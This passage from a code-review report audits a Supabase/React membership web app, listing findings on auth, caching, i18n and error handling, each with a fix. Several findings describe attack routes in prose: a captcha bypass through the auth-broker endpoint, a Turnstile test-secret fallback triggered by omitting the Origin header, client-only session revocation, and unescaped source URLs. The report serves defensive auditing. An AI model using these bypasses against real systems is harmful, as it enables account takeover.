- **What breaks:** Source URLs come from Fleety retrieval (dedupeSources at :660) and are placed directly into <a href={u} target="_blank">. If a retrieved/indexed source carries a javascript: or data: scheme (or an attacker-influenced document lands in the corpus) the terminal renders a clickable link that executes script or navigates to an untrusted payload in the user's session. The href is not scheme-checked here; rel=noopener mitigates window.opener only, not the scheme.
- **Smallest fix:** Validate the scheme (allow only http/https) before rendering the anchor, or drop/neutralize non-http(s) source URLs.

### [Low] TAL-9000 onBlur force-refocus is a keyboard/focus trap  `other` (CONFIRMED)
- **Where:** src/features/tal-9000/TalTerminal.tsx:419-427 (input onBlur) and :78-89 (monitor click handler)
- **What breaks:** On any blur of the chat input the handler re-focuses the input on the next animation frame unless focus moved to a/button/input/textarea/[tabindex]. Screen-reader and keyboard users who move focus to non-interactive readable output (the role=log terminal), browser chrome, or use virtual-cursor navigation get yanked back to the input, making the output unreadable with assistive tech and constituting a focus trap (WCAG 2.1.2). Confirmed: refocus fires unconditionally on blur to any non-listed target.
- **Smallest fix:** Remove the automatic refocus, or gate it behind an explicit user action rather than firing on every blur.

### [Low] VideoEmbed imports Button from a different path than every sibling component  `dependency` (CONFIRMED)
- **Where:** src/features/class-curriculum/components/VideoEmbed.tsx:2 (import { Button } from "@/design-system")
- **What breaks:** Every other component in this feature imports Button from "@/components/ui/button" (CurriculumEditor.tsx:38, SectionEditorDialog.tsx:4, ItemEditorDialog.tsx:9, LearnerCurriculumView.tsx:25); VideoEmbed alone pulls it from "@/design-system". Two supported import surfaces for the same primitive is the exact 'two ways to do one thing' drift the repo warns against — a future prop/styling change to one path leaves this one component silently inconsistent, and it is unclear which is canonical.
- **Smallest fix:** Import Button from "@/components/ui/button" like the rest of the feature, unless @/design-system is the declared single canonical surface (in which case migrate the others).

### [Low] Curriculum reorder is not optimistic despite the comment, and rapid drags race on stale order  `error-handling` (CONFIRMED)
- **Where:** src/features/class-curriculum/components/CurriculumEditor.tsx:6 (header comment), :169-200 (onSectionDragEnd / onItemDragEnd)
- **What breaks:** The file header claims 'Optimistic UI; rollback on error via React Query invalidation' but the handlers `await` the reorder RPC then invalidate — there is no optimistic cache update and no rollback logic (the catch only toasts + refetch). sectionIds (:167) and item ids (:188) are read from last-fetched data; a teacher who drops two reorders quickly has the second computed via arrayMove over the PRE-invalidation order, so the second RPC can persist an order that ignores the first move. The doc/behavior mismatch also misleads maintainers into thinking rollback exists.
- **Smallest fix:** Either implement the optimistic update + rollback the comment describes, or correct the comment; and disable/queue reorders while one is in flight to avoid computing from stale ids.

### [Low] deleteAttachment swallows storage removal failure relying on an unproven orphan sweep  `error-handling` (CONFIRMED)
- **Where:** src/features/class-curriculum/services/classCurriculum.service.ts:270-279 (deleteAttachment .catch(() => undefined))
- **What breaks:** After the DB row is deleted the storage object removal failure is swallowed with `.catch(() => undefined)`, justified by a comment that 'a stray object is swept by orphan-reclamation'. Nothing in this module (or elsewhere confirmed) references or verifies that reclamation job exists. If it doesn't or lags, deleted lesson files persist in the private class-module-files bucket indefinitely — storage cost creep and, worse, a file a teacher believes permanently deleted (the UI double-confirms 'permanently deleted', CurriculumEditor:427,446) remains retrievable by anyone able to mint a signed URL to that path until the sweep runs.
- **Smallest fix:** At minimum report the failed removal (structured error) so it can be reconciled; confirm the orphan-reclamation job actually exists and is referenced, or retry the remove.

---

## App contexts, config, static data & integrations

### [High] i18n opens a second Supabase host path from a different env var, no auth header, silent English fallback  `dependency` (CONFIRMED)
- **Where:** src/i18n/index.ts:56-65 (loadPath); contrast src/integrations/supabase/client.ts:5-11
- **What breaks:** loadPath builds `https://${VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/get-i18n-bundle` via i18next-http-backend's raw fetch — a parallel Supabase data path independent of the one createClient() which uses VITE_SUPABASE_URL. Confirmed both vars exist independently (.env.example lines 1 and 3; vite.config.ts defaults them separately at lines 16/19). If PROJECT_ID is unset in Cloudflare Pages, loadPath falls to `/locales/${lng}/${ns}.json`, and STATIC_LOCALES=['en'] (line 24) means only en exists — so every non-English user silently gets English keys, no error surfaced (parse() returns {} on any failure, lines 75-77). The fetch sends no apikey/Authorization header unlike every other edge call; the day get-i18n-bundle requires the anon key it 401s for all non-en locales at once, still silently.
- **Smallest fix:** Derive the functions base from the single VITE_SUPABASE_URL (or route the bundle through supabase.functions.invoke/auditedInvoke); add the anon key header; report a load error instead of silently degrading to en.

### [High] MemoryCache in data-layer fetchers is never cleared on sign-out — cross-user data leak on in-place user switch  `ownership` (CONFIRMED)
- **Where:** src/data/handbooks.ts:20-35, src/data/workshops.ts:28-43; sign-out path AuthContext.tsx:202-208
- **What breaks:** Confirmed: ResourcesPage.tsx:31 calls fetchHandbooks()/fetchWorkshops() directly (no React Query wrapper), so the module-level MemoryCache (lib/memory-cache.ts, a process-wide Map keyed only by 'handbooks'/'workshops') is the sole cache, 30-min TTL. SIGNED_OUT clears React Query (appQueryClient.clear, line 206) and purges the persisted cache, but nothing calls MemoryCache.clear() (which exists, memory-cache.ts:46). The app supports in-place user switch (switchPersistedQueryCacheToUser, AuthContext.tsx:71-79), so user A signs out and user B signs in without reload; MemoryCache still returns A's rows for up to 30 min. If handbooks/workshops are RLS/tier-gated, B sees A's gated superset. Also DB edits are invisible for 30 min while React-Query views refresh immediately — two cache mechanisms out of coherence.
- **Smallest fix:** Load handbooks/workshops through a React Query hook (single cache, auth-invalidated) like the rest of the app, or hook MemoryCache.clear() into the SIGNED_OUT handler and add write-invalidation.

### [High] Client-side Discord 'new signup' business rule guarded only by per-tab sessionStorage and a 2-minute clock heuristic  `boundary` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:262-276
- **What breaks:** Confirmed: the 'is new signup' decision (`Date.now() - createdAt < 2*60*1000`, line 269) and DiscordNotifyService.userSignedUp (line 273) live in the auth-context effect; idempotency rests solely on sessionStorage.getItem(SESSION_STARTED_AT_KEY) (line 262). sessionStorage is per-tab and cleared on browser close, so: (a) first sign-in in two tabs, or a reload before the key writes, fires duplicate Discord pings; (b) a new account whose OAuth first sign-in lands >2 min after created_at (email-confirm delay, slow onboarding) never notifies; (c) the decision depends on the client clock and client-supplied created_at, so skew or a tampered session suppresses or spoofs the org's signup feed. DiscordNotifyService.notify (discord-notify.service.ts:78-123) additionally swallows all failures (log.warn only), so a failed ping for a real new member is lost with no retry. A domain event emitted from the UI with no server-side dedup or delivery guarantee.
- **Smallest fix:** Emit the signup event server-side (edge function / DB trigger on profile/user creation with a persisted once-per-user guard); the client should neither decide 'is new signup' nor own the notification.

### [High] Profile fetch failure and 10s timeout both silently yield a null profile the app treats as ground truth  `error-handling` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:124-143
- **What breaks:** Confirmed: fetchProfile races ProfileService.fetch against a 10s timeout that resolves null (lines 129-132), wraps in `catch { return null }` (138-139), and `finally { setProfileLoaded(true) }` (140-142). A transient 500/RLS hiccup/slow read yields profile=null with no reportError and no retry, yet profileLoaded flips true so every guard proceeds. A signed-in member is rendered as if they have no profile — no tier, names, or preferred_language — which drives membership gating, greetings, and locale off a false empty state. Note the `if (data) setProfile(data)` guard (134) means an existing profile is preserved on re-fetch, but on FIRST load there is no prior profile, so the null stands. The failure is invisible to ops.
- **Smallest fix:** On fetch error/timeout, reportError and distinguish 'load failed — keep last-known / show retry' from 'genuinely no profile'; do not collapse both to null+proceed.

### [Medium] get-i18n-bundle raw-fetch path bypasses auditedInvoke/circuit-breaker and swallows all errors — zero ops visibility when localization breaks for all non-en users  `error-handling` (CONFIRMED)
- **Where:** src/i18n/index.ts:51-79 (backend loadPath + parse)
- **What breaks:** Unlike every service path (audited-invoke.ts reportError, discord circuit breaker), the i18n bundle load goes through i18next-http-backend's bare fetch. parse() catches JSON errors and returns {} (lines 75-77); the backend swallows HTTP failures into the fallbackLng chain. There is no reportError, no trace id, no severity bump. A get-i18n-bundle outage, a schema change to its {strings} envelope, or a 500 for every non-English member is completely invisible to ops — the app just shows English/keys and no telemetry ever fires. This is the localization equivalent of an edge function being down with no paging.
- **Smallest fix:** Route bundle loads through auditedInvoke (or add a custom backend that calls reportError on non-2xx / parse failure) so localization outages page like other edge failures.
- _added-in-verification_

### [Medium] escapeValue:false globally with AI/DB-sourced translation bundles is a latent XSS if any t()-string reaches an HTML sink  `security` (PLAUSIBLE)
- **Where:** src/i18n/index.ts:44 (escapeValue:false), 116-120 (addResourceBundle from translate-bundle)
- **What breaks:** init disables i18next's escaping globally ('React handles escaping'), and ensureLocale injects bundles from the translate-bundle edge function (AI-translated) and get-i18n-bundle (DB) via addResourceBundle — untrusted/AI content. escapeValue:false is the standard react-i18next pattern and is safe for plain JSX, so this is latent, not an active exploit: I found no i18next t()-string currently flowing into dangerouslySetInnerHTML (the one HTML sink for translated text, TranslatedContent.tsx, is UGC via useUgcTranslation and is sanitized with sanitizeHtml). The risk is second-order: with global escaping off, the first toast-with-markup, PDF generator, or `<Trans>`-with-HTML that renders an AI/DB translation executes injected markup, and nothing at the i18n layer treats bundle content as untrusted.
- **Smallest fix:** Treat translate-bundle/get-i18n-bundle output as untrusted (sanitize on ingest); keep escapeValue default-on and rely on React for JSX, escaping explicitly only at the genuine non-React call sites.
- _first pass claimed active 'stored XSS'; downgraded to PLAUSIBLE/Medium — no confirmed t()->HTML sink exists today; the exposure is latent_

### [Medium] Founding-promo active decision duplicated on client using the client clock; server is the real owner  `ownership` (CONFIRMED)
- **Where:** src/config/membership-tiers.ts:135-154; consumed MembershipTiersGrid.tsx:50
- **What breaks:** isFoundingPromoActive (149-154) re-implements the promo window the comment itself says is authoritatively enforced by the create-gumroad-checkout edge function — two owners of one decision, and the client evaluates it against the local clock (new Date().getTime()). A skewed client disagrees with the server: the UI offers/hides the founding price and CTA (MembershipTiersGrid.tsx:50 gates skuUrl and price display on promoActive) to a user whose checkout the edge function then honors differently — a confusing, revenue-affecting mismatch at the conversion moment.
- **Smallest fix:** Read promo-active from the server (config endpoint or the checkout function's response) rather than recomputing; if a client hint is kept, label it explicitly non-authoritative.
- _first pass also claimed a DST bug ('fixed -04:00 wrong once DST ends'); that sub-claim is FALSE for this window — the promo runs Apr 1–Sep 30, both inside EDT, so -04:00 is correct. Dropped the DST detail; the duplication + client-clock ownership problem stands._

### [Medium] Founding promo price and end date hardcoded as prose in the FAQ — will silently contradict the config when the promo changes  `ownership` (CONFIRMED)
- **Where:** src/data/membership-faq.ts:22-24 vs src/config/membership-tiers.ts:135-142
- **What breaks:** Confirmed: membership-tiers.ts owns FOUNDING_PROMO (endsAt 2026-09-30, yearlyPriceDisplay $49.99). membership-faq.ts:24 restates '$49.99/year' and 'before September 30' and standard-pricing-on-lapse as free prose. MembershipTiersGrid interpolates FOUNDING_PROMO (lines 122/130/353), but the FAQ does not — two copies of the same facts. Change the promo date or price in config and the FAQ under the same tier grid keeps quoting the old numbers — a pricing contradiction shown to users.
- **Smallest fix:** Render the FAQ answers from FOUNDING_PROMO (interpolate price/date) instead of literal strings.

### [Medium] handbooks.ts and workshops.ts are near-identical DB fetchers in the static-data layer, bypassing hooks/services  `boundary` (CONFIRMED)
- **Where:** src/data/handbooks.ts:1-36, src/data/workshops.ts:1-44
- **What breaks:** Confirmed: both modules under src/data (nominally static content) import the supabase client and run `supabase.from(...).select(...).order('name')` directly — data access reaching past the UI->hooks->services->integrations layering (ResourcesPage.tsx:31 calls them straight). They are the same fetch+MemoryCache+throw pattern differing only in table/columns, so any correction (retry, error mapping, cache invalidation, RLS handling) applied to one misses the other — the duplicated-block drift.
- **Smallest fix:** Move both to a single generic React Query hook/service parameterized by table+columns; delete the duplicated MemoryCache logic.

### [Medium] auditedInvoke discards the real upstream status on retry exhaustion and re-throws a shape-stripped error  `error-handling` (CONFIRMED)
- **Where:** src/integrations/supabase/audited-invoke.ts:52-54, 81-95
- **What breaks:** Confirmed: on a transient failure the closure throws `Object.assign(new Error(out.error.message), { status })` (line 53) — a synthetic Error carrying `status` but NO `.context` Response. When withTransientRetry exhausts, it re-throws that synthetic error; the outer catch (81-95) hardcodes `upstream:transport_error` (lines 86/87) and never reads err.status, so a sustained 502/503/504 outage is mislabeled generic transport_error, and for AUTH_CRITICAL functions the paging fingerprint fires but with wrong status. The re-thrown error is stripped of the supabase FunctionsError shape, so callers mapping off `error.context.status` get nothing — degrading both caller handling and ops signal exactly during an all-users outage.
- **Smallest fix:** Preserve the original FunctionsError (attach context/status through withTransientRetry) or report from the last result.error before throwing, so status and error shape survive exhaustion.

### [Medium] auditedInvoke retries status-less failures (incl. CORS/deploy breakage) up to 3x, amplifying load against an already-failing function  `error-handling` (PLAUSIBLE)
- **Where:** src/integrations/supabase/audited-invoke.ts:52; classifier src/lib/transient-error.ts:60-74
- **What breaks:** The closure throws-for-retry whenever status is 502/503/504 OR undefined (line 52). The actual retry is then gated by isTransientError, which matches on message patterns including /Failed to fetch/, /NetworkError/, /FunctionsFetchError/ (transient-error.ts:17-36) and status 0. A CORS-blocked or bad-headers response after a broken deploy surfaces as a status-less 'Failed to fetch'/FunctionsFetchError, which matches — so every client turns each call into 3 calls with backoff against a function that will keep failing until redeployed: needless latency plus a self-inflicted load multiplier at scale.
- **Smallest fix:** Distinguish 'network drop' (retry) from 'CORS/preflight rejected' (do not retry); restrict retry to explicit transient statuses (502/503/504) and genuine offline signals, not every status-less fetch error.
- _first pass said the predicate 'treats status===undefined as transient' unconditionally; corrected — retry is gated by isTransientError's message patterns, but CORS/network failures match those patterns, so the 3x-amplification concern holds_

### [Medium] AuthContext drives i18n global + localStorage and triggers an edge call from an unvalidated profile field  `dependency` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:185-197
- **What breaks:** Confirmed: the provider effect calls ensureLocale(pref) + i18n.changeLanguage(pref) and writes localStorage('tf_lang') straight from profile.preferred_language with no BCP-47 validation. preferred_language is user-controlled; ensureLocale for an unknown tag (i18n/index.ts:104-125) issues a translate-bundle edge invocation, so a profile carrying a junk/adversarial locale forces a per-load edge call (unbounded work driven by mutable client data) and mutates global i18n/document state from inside the auth context — coupling auth to i18n runtime side effects. The ensureLocale boolean result is awaited then discarded (line 192).
- **Smallest fix:** Validate preferred_language against a known tag shape before use; move locale restoration into an i18n-owned hook; branch on the ensureLocale result instead of ignoring it.

### [Medium] useAuth falls back to a globalThis-stored context value in production, hiding out-of-provider misuse and serving stale auth  `boundary` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:467, 479-483
- **What breaks:** Confirmed: every render writes contextValue to globalThis[GLOBAL_VALUE_KEY] (467), and useAuth does `useContext(canonical) ?? globals[GLOBAL_VALUE_KEY]` (481) with no DEV guard. A component mistakenly rendered outside any AuthProvider (a portal/modal root, a stray tree) does NOT throw — it silently reads the last provider's value from globalThis, seeing a signed-in user/profile its own tree never provided. After sign-out the global still holds the previous value until some provider re-renders, so a briefly-mounted consumer can read stale post-logout auth state. The HMR defense (justified in dev) is a production authorization hole.
- **Smallest fix:** Gate the globalThis-value fallback behind import.meta.env.DEV so production throws the missing-provider error instead of serving cross-tree/stale auth state.

### [Medium] OAuth profile sync writes to profiles then swallows every failure  `error-handling` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:159-174
- **What breaks:** Confirmed: syncOAuthProfile calls ProfileService.updateNames (a write to profiles) in two branches, each `catch { /* Non-critical */ }` with an empty body (163, 172). If the write fails (RLS, validation, network) the user's Google-derived name/email never lands, nothing retries, and there is zero telemetry — ops cannot see OAuth profile hydration is broken for a cohort. A silent write-failure on the profiles table is the swallowed-await pattern the rules ban.
- **Smallest fix:** reportError on failure (already imported in the codebase) and let it retry on next load; do not discard a profiles write failure.

### [Medium] Dueling bootstrap writers: INITIAL_SESSION and getSession().then both set session/user and double-fetch profile  `boundary` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:229-237, 367-419
- **What breaks:** Confirmed: two paths write session state at startup — the INITIAL_SESSION branch (setSession/setUser/void fetchProfile, 231-235) and the getSession().then block (setSession/setUser/fetchProfile, 411-415) — coordinated only by sessionRestoreSettledRef set inside the .then (369). The code's own comment notes Firefox can fire INITIAL_SESSION before getSession finishes; if the two resolve with different snapshots (a token refresh landing mid-bootstrap) ordering is nondeterministic and last-writer-wins can install a stale session, and both firing triggers two profile fetches. Two sources of truth for current session with timing-dependent resolution.
- **Smallest fix:** Funnel session resolution through one path that ignores older snapshots (compare access_token/expiry so only the freshest wins) and dedupe the profile fetch.

### [Medium] fetchProfile has no in-flight dedup — concurrent bootstrap paths race and last-writer-wins can install a stale profile  `ownership` (PLAUSIBLE)
- **Where:** src/contexts/AuthContext.tsx:124-143 (called from 234, 279, 415, and refreshProfile 177-179)
- **What breaks:** fetchProfile is fired from at least four uncoordinated sites — the INITIAL_SESSION branch (234), the detached setTimeout after SIGNED_IN (279, which also feeds syncOAuthProfile that calls fetchProfile again at 162/171), the getSession().then (415), and refreshProfile — with no in-flight guard or request-id. On a normal OAuth bootstrap several of these overlap; each independently calls setProfile(data) and setProfileLoaded(true). Whichever resolves last wins, so a slower earlier request can clobber a fresher one, and the 10s-timeout null-resolver racing an in-flight real fetch can flip profileLoaded=true before the real profile lands. Result: intermittent stale/empty profile state that drives tier gating and locale, hard to reproduce.
- **Smallest fix:** Track the latest requested userId + an in-flight promise; ignore resolutions from superseded requests and coalesce concurrent fetches for the same user.
- _added-in-verification_

### [Medium] Supabase client has no env-var guard and touches localStorage at module load — misconfig or restricted storage bricks the app  `error-handling` (CONFIRMED)
- **Where:** src/integrations/supabase/client.ts:5-13
- **What breaks:** Confirmed: SUPABASE_URL/PUBLISHABLE_KEY are read from env with no validation (5-6) and passed straight to createClient, which validates the URL eagerly and throws at import time. A missing/typo'd Cloudflare Pages env var bricks the whole app for all users with an unhandled module-eval throw and no message. Additionally `storage: localStorage` (13) is evaluated at import; in any context where localStorage access throws (some privacy modes, sandboxed iframes) importing this near-universally-imported module throws.
- **Smallest fix:** Validate URL/KEY presence and fail into a contained error boundary with a clear message; guard localStorage behind a safe-storage wrapper/fallback.

### [Medium] community tier declares dual_recurrence CTA with no monthly SKU (and post-promo no yearly SKU) — advertised price with no purchase path  `under-engineering` (CONFIRMED)
- **Where:** src/config/membership-tiers.ts:104-113 vs MembershipTiersGrid.tsx:477-500, EditProfilePage.tsx:562-572
- **What breaks:** community.cta.type='dual_recurrence' renders monthly + yearly Subscribe buttons and displays '$10 USD per month', but skus.monthly is 'TBD' (commented out, line 110) and skus.yearlyRegular is also TBD (112). The consumer does NOT crash — EditProfilePage.tsx:566-571 guards `!intent.skuUrl` and shows a 'not available yet' toast — so the first-pass 'dead-ends or throws' claim is false. The real defect: a live, 'popular'-flagged tier advertises a $10/month price whose monthly Subscribe button only ever says 'not available'; and because the ONLY populated SKU is yearlyFounding, once the promo ends on 2026-09-30 (yearlyRegular still TBD) the yearly button also falls to the 'not available' toast — the tier's entire purchase path silently disappears at promo end. No invariant enforces that a dual_recurrence tier has both SKUs.
- **Smallest fix:** Populate skus.monthly + skus.yearlyRegular, or make cta.type reflect what is actually purchasable (yearly-only while promo runs); add a guard/test asserting a dual_recurrence tier has both SKUs and that a non-promo yearlyRegular exists before 2026-09-30.
- _first pass said the button 'dead-ends or throws'; corrected — a toast guard exists, so no crash. Reframed to the real revenue defect (advertised price with no working SKU, and a purchase cliff at promo end) and kept it._

### [Low] TOKEN_REFRESHED updates session but not user or authEventSessionRef — transient session/user divergence and a possibly pre-refresh bootstrap resolve  `boundary` (PLAUSIBLE)
- **Where:** src/contexts/AuthContext.tsx:240-246
- **What breaks:** The TOKEN_REFRESHED branch calls setSession(...) and returns early without setSession's paired setUser and without updating authEventSessionRef.current. `user` state therefore keeps the pre-refresh User object while `session` advances, so any consumer reading both sees a brief mismatch. Because authEventSessionRef isn't updated here, the bootstrap `resolvedSession = initialSession ?? authEventSessionRef.current` (371) can resolve against a pre-refresh snapshot if a refresh lands during startup. Low-impact because the User id normally is stable across refresh, but the invariant 'session and user always describe the same principal' is not held.
- **Smallest fix:** In TOKEN_REFRESHED, update user (and authEventSessionRef) alongside session, or derive user from session in a single reducer so they cannot diverge.
- _added-in-verification_

### [Low] Detached setTimeout(…,0) runs profile fetch/sync/toast outside React lifecycle after loading is already cleared  `error-handling` (CONFIRMED)
- **Where:** src/contexts/AuthContext.tsx:278-291
- **What breaks:** Confirmed: on SIGNED_IN the handler schedules `setTimeout(async () => { fetchProfile + syncOAuthProfile + maybeShowGoogleLinkToast }, 0)` (278-284) then falls through to `setLoading(false)` synchronously (291). Consumers can observe loading=false with the profile still unresolved (resolved later in the detached callback). The detached work is not tied to unmount, so a fast sign-out/navigation leaves setState landing on a torn-down flow; the promise is fire-and-forget and only the inner helpers catch.
- **Smallest fix:** Await the profile fetch within the handler (or gate loading off its completion) and tie the scheduled work to the effect's lifetime instead of a bare setTimeout.

### [Low] i18n init is fire-and-forget and the module runs document/global side effects on import  `error-handling` (CONFIRMED)
- **Where:** src/i18n/index.ts:34-95
- **What breaks:** Confirmed: `void i18n.init(...)` (34) is not awaited and react.useSuspense:false (84), so a consumer importing this module can call t() before init resolves and render raw keys on first paint. Importing the module also mutates document.documentElement and dispatches a CustomEvent at line 94 and registers a global languageChanged listener at 95 — import-time side effects that make the module order-sensitive and hard to test/tree-shake.
- **Smallest fix:** Expose an awaitable ready promise and gate first render on it (or keep the en bundle synchronously, which it does); move applyDocumentLang registration into an explicit init call rather than an import side effect.

### [Low] ensureLocale collapses all failures to `return false`, and its one caller ignores the result  `error-handling` (CONFIRMED)
- **Where:** src/i18n/index.ts:104-125; caller AuthContext.tsx:192
- **What breaks:** Confirmed: every failure branch of ensureLocale (loadLanguages throw 110-112, invoke error / no bundle 119, outer catch 122) returns false with no telemetry, and the AuthContext caller `await ensureLocale(pref)` (192) discards the boolean before calling changeLanguage anyway. A user whose saved language cannot be loaded silently gets keys/English, changeLanguage still runs, and neither the i18n layer nor ops learns the translation path failed.
- **Smallest fix:** reportError on load failures and have the caller branch on the boolean (keep current language / surface a machine-translated-unavailable hint).

### [Low] PageHeaderContext value recreated every render and silently no-ops outside its provider  `over-engineering` (CONFIRMED)
- **Where:** src/contexts/PageHeaderContext.tsx:29-32, 56, 62-65
- **What breaks:** Confirmed: the provider passes `value={{ header, setHeader }}` (56) — a fresh object every render (unlike AuthContext which useMemos), forcing all usePageHeader consumers to re-render whenever the provider does. Separately, the default context value is a no-op setHeader (30-32) and usePageHeader returns useContext without throwing when no provider is mounted (63-64), so a component using setHeader outside the provider silently fails to update the header — the opposite contract from useAuth's throw, an inconsistency that hides wiring bugs.
- **Smallest fix:** Memoize the context value on [header, setHeader]; and either throw on missing provider (matching useAuth) or explicitly document the no-op default.

### [Low] handbooks/workshops queries are unbounded (no .limit) and cached process-wide for 30 min  `under-engineering` (PLAUSIBLE)
- **Where:** src/data/handbooks.ts:27-31, src/data/workshops.ts:35-37
- **What breaks:** Both fetchers do `.select(...).order('name')` with no .limit and no pagination, then cache the full result in a shared MemoryCache for 30 min. Today these are small curated tables so impact is low, but as content grows the entire table is pulled into memory on the first cold load and pinned for 30 minutes for every user; the workshops select also pulls 15 columns including several array columns. There is no upper bound protecting the client.
- **Smallest fix:** Add an explicit .limit (or pagination) and select only the columns the Resources UI renders; revisit the 30-min TTL if the tables become large.
- _added-in-verification_

---

## Edge: Auth & session

### [High] revoked_sessions revocation is enforced only by cooperative client code — no access-token hook or RLS, so a stolen/live access token survives every revoke path  `security` (CONFIRMED)
- **Where:** src/features/auth/services/session.service.ts:227 (the ONLY runtime reader of is_session_revoked, called inside the SPA getSession wrapper); is_session_revoked defined supabase/migrations/20260602205135_*.sql:7-21; config.toml has NO [auth.hook.custom_access_token]; no RLS policy calls it.
- **What breaks:** Every session-revocation feature (finalize-password-reset, sign-out-all-devices, revoke-user-sessions, admin-sign-out-all-users) writes a revoked_sessions row that is treated as the 'source of truth', but nothing server-side ever checks it — the only consumer is client JS in session.service.ts. An attacker holding an exfiltrated access token (XSS, shared device) simply never runs that code and calls PostgREST/GoTrue with the raw JWT; the revoke row is inert. GoTrue admin.signOut('global') only kills REFRESH tokens, so the attacker's existing ACCESS token stays valid until its natural ~1h expiry. Revocation — the exact tool for an active compromise — does not stop the compromise.
- **Smallest fix:** Enforce is_session_revoked server-side: add a custom access-token hook that rejects/short-circuits revoked sessions, or gate sensitive RLS/RPC on it, and shorten access-token TTL. Client-side eviction is a UX nicety, not a security control.
- _added-in-verification_

### [High] Captcha login gate is fully bypassable via the sibling auth-broker/sign-in/password route (captcha optional there)  `boundary` (CONFIRMED)
- **Where:** auth-broker/index.ts:154-158 (signInWithPassword with options: captchaToken ? {captchaToken} : undefined) vs login-with-captcha/index.ts:15,153-164 (captchaToken mandatory min-20 + Turnstile siteverify). Both verify_jwt=false (config.toml:146,174).
- **What breaks:** login-with-captcha exists to block credential stuffing by requiring Turnstile before the password grant. auth-broker/sign-in/password is an equally public endpoint that passes captchaToken to GoTrue only when the client chooses to send one — schemas.ts:41 makes it .optional(). An attacker POSTs to /auth-broker/sign-in/password with a valid correlationId and no captchaToken and brute-forces all accounts, throttled only by GoTrue's coarse limits. The broker also skips the email-domain allowlist that login-with-captcha enforces (checkEmailDomain). The captcha function is optional at the caller's discretion — security theater.
- **Smallest fix:** Make the broker the single login owner and require a verified captcha server-side (reject when captchaToken absent/invalid), or retire login-with-captcha. Exactly one password-login entrypoint, captcha enforced server-side.

### [High] Turnstile verification is bypassable because 'is production' is decided from the client-controlled Origin/Referer header  `security` (CONFIRMED)
- **Where:** login-with-captcha/index.ts:129-151 (TEST_SECRET fallback when !isProd; isProd = isProductionOrigin(originHost)) via _shared/auth-hosts.ts:11-23 (originHostFromRequest reads Origin/Referer); same pattern check-account-identity/index.ts:81-116.
- **What breaks:** When isProd is false the code retries siteverify against Cloudflare's public always-passes TEST_SECRET (1x0000...AA). isProd is computed purely from the Origin/Referer request header. An attacker omits Origin (originHost becomes '' → isProd false) and sends a token minted from the public test sitekey; the real secret fails, the test-secret fallback passes, captcha 'succeeds'. Defeats the human-verification gate on both login and the identity oracle, making brute force against production trivially automatable.
- **Smallest fix:** Never branch a security control on request headers. Drop the test-secret fallback in deployed builds — gate it on a server-side env flag set only in preview — or require the real secret unconditionally in production.

### [High] Recovery password-update accepts ANY valid session, not a recovery/AAL session — session compromise becomes password takeover  `security` (CONFIRMED)
- **Where:** auth-broker/index.ts:443-451 (getUser then updateUser({password}), no recovery/aal/amr check); finalize-password-reset/index.ts:83-95 via _shared/request-auth.ts:44-45 (getClaims → only checks claims.sub).
- **What breaks:** Both 'complete password reset' endpoints verify only that a JWT is valid and resolves to a user id; neither checks that it is a recovery-flow token or a freshly-reauthenticated (AAL2) session. Any stolen/still-open access token can set a new password without knowing the current one, then lock the legitimate user out. A read-capable session compromise escalates to full account takeover. (Compounded by the revoked_sessions finding above: the victim's later reset can't even evict the attacker's live token.)
- **Smallest fix:** Require the session to be recovery-originated or reauthenticated (inspect amr/aal / GoTrue reauthentication) before updateUser({password}); require current-password reauth for non-recovery sessions.

### [High] record_event called with a p_source_table argument set that does not exist in the deployed signature — PGRST202, swallowed, so the primary login path writes zero telemetry  `error-handling` (CONFIRMED)
- **Where:** Broken p_source_table family: auth-broker/index.ts:101-114 (emitOpsEvent, catch{} at 115-117), auth-reset-smoke/index.ts:133-147 (catch console.error). Canonical signature record_event(p_sink,p_kind,p_actor,p_payload,p_severity,p_ref_table,p_ref_id) — migrations/20260602230329_*.sql:62-70. Correct callers: record-auth-event:83-91, record-auth-recovery:158-176, finalize-password-reset:109-117.
- **What breaks:** PostgREST resolves RPCs by exact named-argument set. record_event has NO p_source_table parameter — it has p_ref_table + p_ref_id. Every auth-broker and auth-reset-smoke call therefore throws PGRST202 'no function matches' and is silently swallowed. auth-broker is the credentialed login front door, so ALL its sign-in success/failure/latency ops_events (emitOpsEvent) are never written. Ops dashboards and the soak runbook show a false all-clear during a real auth incident — exactly the Discord-linking PGRST202 failure class in the team memory.
- **Smallest fix:** Change the broker + smoke callers to p_ref_table/p_ref_id (the deployed signature). Add a CI/contract test that fails on record_event argument-name drift; route the swallowed RPC error to a distinct alerting sink instead of catch{}.

### [High] Public unauthenticated telemetry sinks accept a spoofable actor id and unbounded writes; record-auth-event has no rate limit at all  `security` (CONFIRMED)
- **Where:** record-auth-event/index.ts:53-96 (verify_jwt=false, actor read from body:76-77, service-role write, NO rate limiter anywhere in file); record-auth-recovery/index.ts:92-181; record-auth-wedge/index.ts:57-166 (all public service-role writers).
- **What breaks:** record-auth-event runs as service role with verify_jwt=false, takes actor as an attacker-supplied UUID (only a kind allowlist + 1KB cap, and literally zero rate limiting), and writes ops_events. Anyone can forge 'auth_engine.sign_in_succeeded' rows attributed to any user id, or flood ops_events/auth_wedge_events to fabricate a wedge spike that masks a real key-rotation incident, or bury real signal. Attribution in the audit/telemetry store is untrustworthy and the DB absorbs unbounded anonymous writes.
- **Smallest fix:** Never accept actor from an unauthenticated body — derive from a verified token or store null. Add DB-backed per-identifier rate limiting (record-auth-event has none). Treat these rows as self-reported/untrusted in every dashboard.

### [High] Irreversible self-serve account deletion requires only a bearer token — no re-auth or step-up  `security` (CONFIRMED)
- **Where:** delete-account/index.ts:55-82 (getUser then admin.deleteUser; on_auth_user_deleted trigger cascades all public.* rows). verify_jwt=false (config.toml:198).
- **What breaks:** A single valid access token permanently deletes the account and cascade-wipes every related row in one transaction — no password confirmation, no AAL2 step-up, no grace period. A hijacked or borrowed session destroys the user's entire data footprint irreversibly. The asymmetry is stark: admin destructive ops go through requireFreshAdmin2fa (revoke-user-sessions:47, admin-purge:72, admin-sign-out-all:42) but self-destruct requires nothing comparable.
- **Smallest fix:** Require fresh reauthentication (password re-entry or AAL2) before deletion, and/or soft-delete + delayed hard-purge so it is recoverable.

